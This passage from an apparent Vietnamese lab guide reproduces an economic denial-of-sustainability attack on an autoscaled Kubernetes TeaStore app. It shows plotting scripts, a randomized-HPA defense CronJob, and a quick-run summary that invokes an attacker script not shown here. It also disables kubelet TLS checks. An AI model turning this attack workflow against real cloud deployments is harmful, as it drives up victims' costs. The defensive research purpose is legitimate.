        a = billing(atk_sus, f"Attack K={K}")
        efficiency(b, a, K, frac)
```

```powershell
# Phan tich (frac_attack lay tu output cua attacker_controller.py)
python analyze.py results\baseline_su.csv results\attack_K5_su.csv 5 0.37
```

### 11.3 Tạo biểu đồ so sánh

Tạo file `C:\edos-demo\plot_results.py`:

```python
"""Ve bieu do so sanh SU utilization."""
import csv, sys, os
import numpy as np
import matplotlib.pyplot as plt

def load(f):
    sus = []
    with open(f) as fh:
        for r in csv.DictReader(fh):
            sus.append(float(r["total_su"]))
    return np.array(sus)

def plot(baseline_file, attack_files):
    fig, axes = plt.subplots(1, 2, figsize=(14, 5))

    base = load(baseline_file)
    t = np.arange(len(base))

    # Per-minute SU
    axes[0].plot(t, base, label="K=0 (Baseline)", linewidth=2)
    for f, k in attack_files:
        if os.path.exists(f):
            d = load(f)
            axes[0].plot(np.arange(len(d)), d, label=f"K={k}",
                        linewidth=1, linestyle="--")
    axes[0].set_xlabel("Time (min)")
    axes[0].set_ylabel("Service Units")
    axes[0].set_title("Per-minute SU Utilization")
    axes[0].legend()
    axes[0].grid(True, alpha=0.3)

    # Rolling mean
    axes[1].plot(t, np.cumsum(base)/np.arange(1,len(base)+1),
                label="K=0", linewidth=2)
    for f, k in attack_files:
        if os.path.exists(f):
            d = load(f)
            axes[1].plot(np.arange(len(d)),
                        np.cumsum(d)/np.arange(1,len(d)+1),
                        label=f"K={k}", linewidth=1, linestyle="--")
    axes[1].set_xlabel("Time (min)")
    axes[1].set_ylabel("Service Units (rolling avg)")
    axes[1].set_title("Mean per-hour SU Utilization")
    axes[1].legend()
    axes[1].grid(True, alpha=0.3)

    plt.tight_layout()
    plt.savefig("results\\su_comparison.png", dpi=150)
    print("[OK] Saved results\\su_comparison.png")
    plt.show()

if __name__ == "__main__":
    baseline = sys.argv[1]
    attacks = []
    for a in sys.argv[2:]:
        parts = a.split(":")
        attacks.append((parts[0], int(parts[1])))
    plot(baseline, attacks)
```

```powershell
python plot_results.py results\baseline_su.csv results\attack_K5_su.csv:5 results\attack_K10_su.csv:10
```

---

## Bước 12: Randomized Defense (Countermeasure)

### 12.1 Deploy CronJob patch HPA

Tạo file `C:\edos-demo\randomized-defense.yaml`:

```powershell
@"
apiVersion: v1
kind: ServiceAccount
metadata:
  name: randomized-scaler
  namespace: teastore
---
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: hpa-patcher
  namespace: teastore
rules:
  - apiGroups: ["autoscaling"]
    resources: ["horizontalpodautoscalers"]
    verbs: ["get", "patch", "update"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: hpa-patcher-binding
  namespace: teastore
subjects:
  - kind: ServiceAccount
    name: randomized-scaler
    namespace: teastore
roleRef:
  kind: Role
  name: hpa-patcher
  apiGroup: rbac.authorization.k8s.io
---
apiVersion: batch/v1
kind: CronJob
metadata:
  name: randomized-scaler
  namespace: teastore
spec:
  schedule: "* * * * *"
  successfulJobsHistoryLimit: 3
  failedJobsHistoryLimit: 1
  jobTemplate:
    spec:
      template:
        spec:
          serviceAccountName: randomized-scaler
          containers:
            - name: scaler
              image: bitnami/kubectl:latest
              command:
                - /bin/sh
                - -c
                - |
                  RAND=`od -An -N1 -tu1 /dev/urandom | tr -d ' '`
                  RAND=`expr $RAND % 100`
                  if [ $RAND -lt 50 ]; then
                    echo "[SCALE] CPU target = 80 (normal)"
                    kubectl patch hpa hpa-webui -n teastore \
                      --type=merge \
                      -p '{"spec":{"metrics":[{"type":"Resource","resource":{"name":"cpu","target":{"type":"Utilization","averageUtilization":80}}}]}}'
                  else
                    echo "[SKIP] CPU target = 99 (suppressed)"
                    kubectl patch hpa hpa-webui -n teastore \
                      --type=merge \
                      -p '{"spec":{"metrics":[{"type":"Resource","resource":{"name":"cpu","target":{"type":"Utilization","averageUtilization":99}}}]}}'
                  fi
          restartPolicy: OnFailure
"@ | Out-File -Encoding utf8 randomized-defense.yaml
```

### 12.2 Deploy và test

```powershell
kubectl apply -f randomized-defense.yaml

# Kiem tra CronJob
kubectl get cronjob -n teastore

# Xem logs cua job gan nhat
kubectl get jobs -n teastore --sort-by=.metadata.creationTimestamp
kubectl logs job/<job-name> -n teastore
```

### 12.3 Chạy lại thí nghiệm với defense

```powershell
# Terminal 2: Legitimate traffic
jmeter -n -t legitimate-random.jmx -l results\defense_baseline.jtl

# Terminal 3: Attacker
python attacker_controller.py 5

# Thu thap & phan tich
python collect_metrics.py 30 results\defense_K5_su.csv
python analyze.py results\defense_baseline_su.csv results\defense_K5_su.csv 5 0.37
```

---

## Dọn dẹp sau khi xong

```powershell
# Xoa cluster
kind delete cluster --name edos-cluster

# Xoa Docker images (tuy chon)
docker image prune -a
```

---

## Tóm tắt quy trình chạy nhanh

```powershell
# 1. Tao cluster
kind create cluster --config kind-config.yaml

# 2. Setup
kubectl create namespace teastore
kubectl create namespace monitoring
kubectl apply -f https://github.com/kubernetes-sigs/metrics-server/releases/latest/download/components.yaml
kubectl patch deployment metrics-server -n kube-system --type=json -p='[{"op":"add","path":"/spec/template/spec/containers/0/args/-","value":"--kubelet-insecure-tls"},{"op":"add","path":"/spec/template/spec/containers/0/args/-","value":"--kubelet-preferred-address-types=InternalIP"}]'

# 3. Deploy
kubectl apply -f teastore.yaml
kubectl apply -f hpa.yaml
helm install monitoring prometheus-community/kube-prometheus-stack -n monitoring -f monitoring-values.yaml --wait --timeout 10m

# 4. Cho moi thu ready (~5 phut)
kubectl get pods -A

# 5. Chay test (3 terminals)
#   T1: kubectl get hpa -n teastore -w
#   T2: jmeter -n -t legitimate-random.jmx -l results\baseline.jtl
#   T3: python attacker_controller.py 5

# 6. Thu thap & phan tich
python collect_metrics.py 30 results\su_data.csv
python analyze.py results\baseline_su.csv results\attack_K5_su.csv 5 0.37
```
